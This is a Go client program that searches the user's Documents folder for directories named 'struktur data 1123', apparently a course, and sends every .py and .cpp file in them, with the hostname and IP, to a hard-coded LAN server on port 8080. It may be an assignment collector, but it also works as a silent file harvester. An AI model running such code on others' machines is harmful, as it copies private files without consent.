package main

import (
    "fmt"
    "io"
    "log"
    "net"
    "os"
    "path/filepath"
    "strings"
    "sync"
    "time"
)

type Client struct {
    serverIP   string
    clientIP   string
    hostname   string
    searchPath string
}

func NewClient(serverIP string) (*Client, error) {
    hostname, err := os.Hostname()
    if err != nil {
        return nil, fmt.Errorf("failed to get hostname: %v", err)
    }

    clientIP, err := getLocalIP()
    if err != nil {
        return nil, fmt.Errorf("failed to get local IP: %v", err)
    }

    return &Client{
        serverIP:   serverIP,
        clientIP:   clientIP,
        hostname:   hostname,
        searchPath: getDocumentsPath(),
    }, nil
}

func getLocalIP() (string, error) {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "", err
    }
    for _, address := range addrs {
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String(), nil
            }
        }
    }
    return "", fmt.Errorf("no valid local IP found")
}

func getDocumentsPath() string {
    home, err := os.UserHomeDir()
    if err != nil {
        log.Printf("Error getting home directory: %v", err)
        return ""
    }
    return filepath.Join(home, "Documents")
}

func (c *Client) SendFile(filePath string) error {
    conn, err := net.Dial("tcp", c.serverIP+":8080")
    if err != nil {
        return fmt.Errorf("connection failed: %v", err)
    }
    defer conn.Close()

    file, err := os.Open(filePath)
    if err != nil {
        return fmt.Errorf("failed to open file: %v", err)
    }
    defer file.Close()

    // Get relative path
    relPath, err := filepath.Rel(c.searchPath, filePath)
    if err != nil {
        return fmt.Errorf("failed to get relative path: %v", err)
    }

    // Send client info and relative path
    header := fmt.Sprintf("%s|%s|%s|%s\n", c.clientIP, c.hostname, relPath, filePath)
    if _, err := conn.Write([]byte(header)); err != nil {
        return fmt.Errorf("failed to send header: %v", err)
    }

    // Send file content
    if _, err := io.Copy(conn, file); err != nil {
        return fmt.Errorf("failed to send file: %v", err)
    }

    return nil
}

// ProcessDirectory searches for target files and sends them
func (c *Client) ProcessDirectory() error {
    var wg sync.WaitGroup
    errChan := make(chan error, 100)

    err := filepath.Walk(c.searchPath, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return err
        }

        if info.IsDir() && strings.Contains(strings.ToLower(info.Name()), "struktur data 1123") {
            files, err := filepath.Glob(filepath.Join(path, "*.py"))
            if err != nil {
                return err
            }

            cppFiles, err := filepath.Glob(filepath.Join(path, "*.cpp"))
            if err != nil {
                return err
            }

            files = append(files, cppFiles...)

            for _, file := range files {
                wg.Add(1)
                go func(filepath string) {
                    defer wg.Done()
                    if err := c.SendFile(filepath); err != nil {
                        errChan <- fmt.Errorf("error sending file %s: %v", filepath, err)
                    }
                }(file)
            }
        }
        return nil
    })

    if err != nil {
        return fmt.Errorf("error walking directory: %v", err)
    }

    // Wait for all goroutines to complete
    go func() {
        wg.Wait()
        close(errChan)
    }()

    // Collect any errors
    var errors []string
    for err := range errChan {
        errors = append(errors, err.Error())
    }

    if len(errors) > 0 {
        return fmt.Errorf("encountered errors: %v", strings.Join(errors, "; "))
    }

    return nil
}

func main() {
    // Set default server IP
    serverIP := "192.168.2.50"

    // Override with command line argument if provided
    if len(os.Args) > 1 {
        serverIP = os.Args[1]
    }
	log.Println(serverIP)
    // Create new client
    client, err := NewClient(serverIP)
    if err != nil {
        log.Fatalf("Failed to create client: %v", err)
    }

    // Start processing with retry mechanism
    maxRetries := 3
    for i := 0; i < maxRetries; i++ {
        err = client.ProcessDirectory()
        if err == nil {
            break
        }
        log.Printf("Attempt %d failed: %v", i+1, err)
        if i < maxRetries-1 {
            time.Sleep(time.Second * 5)
        }
    }

    if err != nil {
        log.Fatalf("Failed to process directory after %d attempts: %v", maxRetries, err)
    }

    log.Println("File transfer completed successfully")
}